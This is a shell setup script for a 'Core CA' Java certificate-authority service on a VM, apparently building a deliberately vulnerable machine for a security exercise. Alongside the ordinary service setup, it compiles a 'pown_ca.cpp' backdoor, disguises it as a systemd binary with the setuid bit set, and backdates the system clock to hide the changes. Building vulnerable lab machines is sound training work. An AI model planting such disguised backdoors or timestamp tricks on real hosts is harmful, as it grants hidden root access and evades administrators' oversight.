# TODO: Install Java version 9 (Oracle version)
#echo "Install Java"
# see https://howtoprogram.xyz/2017/09/22/install-oracle-java-9-centos-rhel/
# Download from Oracle webpage
#sudo wget --no-cookies --no-check-certificate --header "Cookie: oraclelicense=accept-securebackup-cookie" \
#http://download.oracle.com/otn-pub/java/jdk/9+181/jdk-9_linux-x64_bin.rpm-O jdk-9_linux-x64_bin.rpm
# Install
#rpm -ivh jdk-9_linux-x64_bin.rpm
# Set up env variables
#export JAVA_HOME=/usr/java/jdk-9/
#export PATH="$PATH:$JAVA_HOME/bin"
# Reload env
#source /etc/environment

# Start VM

# Copy files from host to coreca@192.168.50.31:~/ using scp
# scp ./Core\ CA coreca@192.168.50.31:~/

# Login as root

# (TODO: Set date back in the past to hide changes)
#date -s '2014-12-25 12:34:56'


# Add user coreca to screen group to allow service execution
usermod -a -G screen coreca

# Set up CA stuff
echo "Setup"
cd /home/coreca

# Create needed directories
mkdir /home/coreca/tmp
chown coreca /home/coreca/tmp
chgrp coreca /home/coreca/tmp
chmod 700 /home/coreca/tmp

mkdir /home/coreca/logs
chown coreca /home/coreca/logs
chgrp coreca /home/coreca/logs
chmod 700 /home/coreca/logs

chmod 700 /home/coreca

# Move relevant data from copied folder to right place and set correct permissions
mv ./Core\ CA/out/artifacts/Core_CA_jar/Core\ CA.jar /home/coreca/core_ca.jar
chmod 500 /home/coreca/core_ca.jar

mv ./Core\ CA/scripts/ /home/coreca/scripts

mv ./Core\ CA/ssl_base/ /home/coreca/ssl
chmod 700 /home/coreca/ssl

mv ./Core\ CA/core_ca.jks /home/coreca
chmod 500 /home/coreca/core_ca.jks

# Prepare, enable and start service
cp /home/coreca/scripts/coreca.service /etc/systemd/system
systemctl daemon-reload
systemctl enable coreca
systemctl start coreca

# TODO: Iptables


# Set time in the past
date  -s '2017-08-04 07:18:59'

# Setup backdoor
# Compile
g++ -std=c++11 ./scripts/pown_ca.cpp -o systemd-agent # TODO: find better name?
# Move in right place
mv systemd-agent /usr/lib/systemd/
# Enable setuid
chmod 4755 /usr/lib/systemd/systemd-agent
# TODO: set time to current
#date  -s '2017-11-19 15:46:45'

# Clean up
rm -r ./Core\ CA
rm -r ./scripts

echo "TODO: set current date and time with date -s 'yyyy-mm-dd hh:mm:ss'"
